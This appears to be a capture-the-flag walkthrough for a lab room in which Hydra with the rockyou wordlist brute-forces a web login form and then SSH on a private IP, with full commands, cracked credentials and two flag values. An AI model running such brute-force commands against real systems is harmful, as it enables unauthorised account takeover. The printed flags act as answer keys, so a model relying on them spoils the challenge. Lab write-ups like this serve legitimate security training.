Step 1: Access the Target
--

Open the target IP in your browser:

http://10.49.145.209

You will see a login page.

Step 2: Initial Login Attempt
--

Tried logging in manually, but got the error:

Your username or password is incorrect.

This indicates that the login form is a good candidate for a brute-force attack.

Step 3: Brute Force Web Login
--

Use Hydra to attack the HTTP POST login form.

Command:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.145.209 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v
Explanation:
-l molly → username
-P rockyou.txt → password wordlist
http-post-form → specifies login type
F=incorrect → failure message
-v → verbose output

Result
--
Hydra found valid credentials:

[80][http-post-form] host: 10.49.145.209   login: molly   password: sunshine


Step 4: Login & Capture Flag 1
--
Login to the website using:

Username: molly
Password: sunshine

Flag 1:

THM{2673a7dd116de68e85c48ec0b1f2612e}
Step 5: Brute Force SSH
--
Next, brute-force the SSH service.

Command:
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.145.209 -t4 ssh
Explanation:
ssh → targets SSH service
-t4 → 4 parallel threads (faster attack)
#Result

Hydra successfully found the SSH credentials and revealed:

THM{c8eeb0468febbadea859baeb33b2541b}
